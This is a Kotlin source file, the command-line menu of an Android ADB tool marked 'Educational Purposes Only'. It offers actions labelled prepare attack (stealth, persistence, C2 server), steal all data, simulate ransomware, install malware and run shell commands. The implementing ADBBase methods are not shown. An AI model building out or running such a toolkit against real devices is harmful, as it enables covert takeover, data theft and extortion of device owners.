package Src

import Src.ADB.ADBBase
import java.util.Scanner

fun main() {
    val adb = ADBBase()
    val scanner = Scanner(System.`in`)

    println("--- ADB Interface (Educational Purposes Only) ---")
    println("Connected to ADB? ${adb.isAdbAccessible()}")
    println("Device Rooted? ${adb.isDeviceRooted()}")
    println()
    println("Available actions:")
    println("1. Prepare Attack (Enable stealth, persistent access, start C2)")
    println("2. Steal All Data (to /sdcard/stolen_data)")
    println("3. Dump System Info (to /sdcard/system_info)")
    println("4. Simulate Ransomware")
    println("5. Install Malware")
    println("6. Execute Shell Command")
    println("7. List Files")
    println("8. Pull File")
    println("9. Push File")
    println("10. Install APK")
    println("11. Uninstall App")
    println("12. Clear App Data")
    println("13. Reboot Device")
    println("14. Take Screenshot")
    println("15. Get Device Info")
    println("16. Read Logcat")
    println("17. Check Device Status")
    println("18. C2 - Start Server (already integrated in Prepare Attack)")
    println("19. C2 - Stop Server")
    println("0. Exit")

    while (true) {
        print("Enter action number: ")
        val choice = scanner.nextLine()

        when (choice) {
            "1" -> {
                println("Preparing attack...")
                adb.prepareAttack()
                println("Attack preparation initiated.")
            }
            "2" -> {
                val destination = "/sdcard/stolen_data"
                println("Stealing all accessible data to: $destination")
                adb.exfiltrateData(destination)
                println("Data exfiltration process started (check device for progress).")
            }
            "3" -> {
                val destination = "/sdcard/system_info"
                println("Dumping system information to: $destination")
                adb.dumpSystemInfo(destination)
                println("System information dumping initiated (check device for files).")
            }
            "4" -> {
                println("Simulating ransomware...")
                adb.simulateRansomware()
                println("Ransomware simulation initiated.")
            }
            "5" -> {
                print("Enter path to APK: ")
                val apkPath = scanner.nextLine()
                if (apkPath.isNotBlank()) {
                    println("Installing malware from: $apkPath")
                    adb.installMalware(apkPath)
                    println("Malware installation initiated.")
                } else {
                    println("APK path cannot be empty.")
                }
            }
            "6" -> {
                print("Enter shell command to execute: ")
                val command = scanner.nextLine()
                if (command.isNotBlank()) {
                    println("Executing command: $command")
                    val result = adb.executeMaliciousCommand(command)
                    println("Command execution result:\n$result")
                } else {
                    println("Command cannot be empty.")
                }
            }
            "7" -> {
                print("Enter path to list (default: /sdcard): ")
                val path = scanner.nextLine()
                val listPath = if (path.isBlank()) "/sdcard/" else path
                println("Listing files in: $listPath")
                val fileList = adb.listFiles(listPath)
                println(fileList)
            }
            "8" -> {
                print("Enter device path to pull: ")
                val devicePath = scanner.nextLine()
                print("Enter local path to save: ")
                val localPath = scanner.nextLine()
                if (devicePath.isNotBlank() && localPath.isNotBlank()) {
                    println("Pulling '$devicePath' to '$localPath'")
                    adb.pullFile(devicePath, localPath)
                    println("File pull initiated.")
                } else {
                    println("Device and local paths cannot be empty.")
                }
            }
            "9" -> {
                print("Enter local path to push: ")
                val localPath = scanner.nextLine()
                print("Enter device path to save to: ")
                val devicePath = scanner.nextLine()
                if (localPath.isNotBlank() && devicePath.isNotBlank()) {
                    println("Pushing '$localPath' to '$devicePath'")
                    adb.pushFile(localPath, devicePath)
                    println("File push initiated.")
                } else {
                    println("Local and device paths cannot be empty.")
                }
            }
            "10" -> {
                print("Enter path to APK to install: ")
                val apkPath = scanner.nextLine()
                if (apkPath.isNotBlank()) {
                    println("Installing APK from: $apkPath")
                    adb.installApk(apkPath)
                    println("APK installation initiated.")
                } else {
                    println("APK path cannot be empty.")
                }
            }
            "11" -> {
                print("Enter package name to uninstall: ")
                val packageName = scanner.nextLine()
                if (packageName.isNotBlank()) {
                    println("Uninstalling package: $packageName")
                    adb.uninstallApp(packageName)
                    println("Uninstall process initiated.")
                } else {
                    println("Package name cannot be empty.")
                }
            }
            "12" -> {
                print("Enter package name to clear data: ")
                val packageName = scanner.nextLine()
                if (packageName.isNotBlank()) {
                    println("Clearing data for: $packageName")
                    adb.clearAppData(packageName)
                    println("Clear data process initiated.")
                } else {
                    println("Package name cannot be empty.")
                }
            }
            "13" -> {
                println("Rebooting device...")
                adb.rebootDevice()
                println("Reboot command sent.")
            }
            "14" -> {
                val filename = "screenshot.png"
                println("Taking screenshot and saving as $filename")
                adb.takeScreenshot(filename)
                println("Screenshot taken (check device root directory).")
            }
            "15" -> {
                println("Device Information:")
                println("Model: ${adb.getDeviceModel()}")
                println("Serial: ${adb.getDeviceSerialNumber()}")
                println("Android Version: ${adb.getAndroidVersion()}")
            }
            "16" -> {
                println("--- Logcat Output ---")
                println(adb.readLogcat())
                println("--- End of Logcat ---")
            }
            "17" -> {
                println("--- Device Status ---")
                println("ADB Accessible: ${adb.isAdbAccessible()}")
                println("Rooted: ${adb.isDeviceRooted()}")
                println("--- End of Status ---")
            }
            "19" -> {
                println("Stopping C2 server...")
                adb.stopC2Server()
                println("C2 server stopped.")
            }
            "0" -> break
            else -> println("Invalid action. Please enter a valid number.")
        }
        println()
    }

    adb.cleanup()
    println("Exiting.")
    scanner.close()
}

fun showDescription(actionNumber: String) {
    val descriptions = mapOf(
        "1" to "Prepare Attack: Enable stealth, persistent access, and start C2 server.",
        "2" to "Steal All Data: Exfiltrate all accessible data to /sdcard/stolen_data.",
        "3" to "Dump System Info: Dump system information to /sdcard/system_info.",
        "4" to "Simulate Ransomware: Simulate ransomware on the device.",
        "5" to "Install Malware: Install malware from a specified APK path.",
        "6" to "Execute Shell Command: Execute a shell command on the device.",
        "7" to "List Files: List files in a specified directory.",
        "8" to "Pull File: Pull a file from the device to the local machine.",
        "9" to "Push File: Push a file from the local machine to the device.",
        "10" to "Install APK: Install an APK on the device.",
        "11" to "Uninstall App: Uninstall an application from the device.",
        "12" to "Clear App Data: Clear data for a specified application.",
        "13" to "Reboot Device: Reboot the device.",
        "14" to "Take Screenshot: Take a screenshot and save it to the device.",
        "15" to "Get Device Info: Retrieve device information such as model, serial number, and Android version.",
        "16" to "Read Logcat: Read the logcat output from the device.",
        "17" to "Check Device Status: Check the ADB accessibility and root status of the device.",
        "18" to "C2 - Start Server: Start the C2 server (already integrated in Prepare Attack).",
        "19" to "C2 - Stop Server: Stop the C2 server.",
        "0" to "Exit: Exit the tool."
    )

    println(descriptions[actionNumber] ?: "Invalid action number.")
}
